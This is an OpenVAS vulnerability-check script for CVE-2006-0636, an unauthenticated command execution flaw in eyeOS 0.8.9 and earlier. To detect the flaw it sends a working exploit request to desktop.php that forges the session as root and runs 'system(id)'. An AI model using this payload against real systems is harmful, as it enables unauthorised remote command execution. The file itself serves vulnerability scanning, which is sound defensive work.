# OpenVAS Vulnerability Test
# $Id: eyeos_command_execution.nasl 9349 2018-04-06 07:02:25Z cfischer $
# Description: EyeOS <= 0.8.9 Command Execution Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2006 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote system contains a PHP application that is prone to 
command execution flaws. 

Description :

The remote system is running a vulnerable version of eyeOS.

EyeOS is a web based operating system, which makes it possible
to access data and applications remote by using a web-browser.

The installed version does not initialize user sessions properly,
allowing unauthenticated attackers to execute arbitrary commands 
with the privileges of the webserver.";

tag_solution = "Upgrade to eyeOS version 0.8.10.";

# Original advisory / discovered by :
# http://www.gulftech.org/?node=research&article_id=00096-02072006

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.80008");
 script_version("$Revision: 9349 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:02:25 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
 script_cve_id("CVE-2006-0636");
 script_bugtraq_id(16537);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("EyeOS <= 0.8.9 Command Execution Vulnerability");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.gulftech.org/?node=research&article_id=00096-02072006");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

foreach dir( make_list_unique( "/eyeOS", "/eyeos", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/desktop.php"), port:port); 
  if(res == NULL) continue;
 
  if (egrep(pattern:">Welcome to eyeOS v\. [0-9.]+", string:res)) {
    url = "eyeOptions.eyeapp&a=eyeOptions.eyeapp&_SESSION[usr]=root&_SESSION[apps][eyeOptions.eyeapp][wrapup]=";
    cmd = "system(id)";

    # Try to execute a remote command.
    url = string(dir, "/desktop.php?baccio=", url, cmd, ";");
    req = http_get(item:url, port:port);
    recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);  
    if (recv == NULL) continue;

    if (egrep(pattern:"uid=[0-9]+.*gid=[0-9]+", string:recv)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );